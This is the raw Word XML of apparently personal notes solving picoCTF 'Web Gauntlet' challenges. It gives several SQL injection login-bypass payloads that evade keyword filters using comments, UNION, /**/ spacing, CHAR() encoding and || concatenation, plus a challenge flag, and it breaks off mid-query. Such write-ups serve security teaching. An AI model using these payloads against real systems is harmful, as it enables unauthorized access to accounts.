    <w:p w14:paraId="1F6A9D39" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Use basic injection and comment out the rest of the line.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581E55F1" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ED3EE4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4368A03D" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FD80F77"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3ED610C3"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2 - filter: or and like = –</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354DDC16" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Without --, check for other ways to comment. We can also use UNION to get our specific user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07010A44" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DF3971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14F90728" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3094584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460B9853"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 union select * from users where username in("admin")/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DF7DA5" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29E40673"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 union select * from users where username in("admin")/* AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD825A6"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3 - filter: or and = like &gt; &lt; –</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2909CE" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>The first injection from the previous round still works here, but let’s try to get the second to work too. Spaces are now blocked, but we can use /**/ comments for the same effect. I tried %20 to replace all the spaces, but it was not effective.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2769D5AA" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2236AC95"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admin'/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26879118" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39D60BB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username='admin'/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638BC4E4"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'/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040D4A21" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CE18BAA" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B7AAA9"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4 - filter: or and = like &gt; &lt; – admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781AEE2E" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00242C83">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>In SQLITE, || is a concatenation operator</w:t>
      </w:r>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>. The simple solution is to simply split up “admin” in a way to bypass the filter. A more complicated solution could include encoding encode “admin” in ASCII number code and using the SQL CHAR() function to decode it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C306448" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2783E484"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9E264F0" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D46FB84"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372BD6DD" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>input: '/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DEA2F2" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="231DDC68" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9D47FD" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Round 5 - filter: or and = like &gt; &lt; – union admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDF9651" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Splitting up “admin” still works as only UNION is additionally blacklisted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B96805B" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57C728A8" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">input: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>adm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'||'in'/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6F89C7" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A83C1A3" w14:textId="68055B7A" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username='</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>adm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'||'in'/* AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79211BA7" w14:textId="062ED400" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D87C111" w14:textId="6C068470" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51139FAB" w14:textId="44B8BC8C" w:rsidR="007C7A2D" w:rsidRDefault="00930F85" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>filter.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="73A1BE66" w14:textId="33727FDD" w:rsidR="007C7A2D" w:rsidRDefault="00930F85" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00930F85">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00930F85">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E0C139" w14:textId="47080E1F" w:rsidR="00E54A70" w:rsidRDefault="00E54A70" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B129A33" w14:textId="33B24F53" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="552B0789" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">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Web Gauntlet 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECCFF7D"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49724DC1" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">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11DBBF5" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">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2CC06D7D" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FF9F89"/>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If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3512D3" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">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8200E42" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">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Last time, I promise! Only 25 characters this time. Log in as admin Site: </w:t>
      </w:r>
      <w:hyperlink r:id="rId136" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:63504/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> Filter: </w:t>
      </w:r>
      <w:hyperlink r:id="rId137" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:63504/filter.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F55A87B" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRPr="00A35726" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="100" w:afterAutospacing="1"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>SELECT username, password FROM users WHERE username='ad'||'min' AND password=</w:t>
      </w:r>
      <w:r w:rsidRPr="00242C83">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>'a' is not 'b'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1776B405" w14:textId="5AF3F6B8" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Filters: or and true false union like = &gt; &lt; ; -- /* */ admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4CE368" w14:textId="0CBD0292" w:rsidR="00E54DC9" w:rsidRDefault="00E54DC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78DBBDA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First things first, we need to find a way to get admin to not be filtered. Fortunately they haven't banned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xml:space="preserve"> which is concatenates strings in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We can get the string admin by just putting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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210869B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Next, we need to find a way to bypass the password checking. We see that they haven't filtered any of the binary operators, which also happen to be 1 character long. We can use these, especially the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(binary or operator)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t> to bypass the password checking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACB8F07"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We can also use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to replace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 and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w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3AF6AE"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From this I created the inputs:&lt;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71643B5"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However for some reason this didn't seem to work. I opened up an online </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>sqlite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> compiler at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https://sqliteonline.com/</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t> to do some more testing, and found that for some reason the | operator would return true if I put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IS NOT ''</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>. So I replaced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w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t> with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IS NOT</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t> in the query, and it worked!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C305012"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Final Input:&lt;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Username: </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Password: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 Which would query: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:color w:val="DD1144"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>SELECT username, password FROM users WHERE username='</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:color w:val="DD1144"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
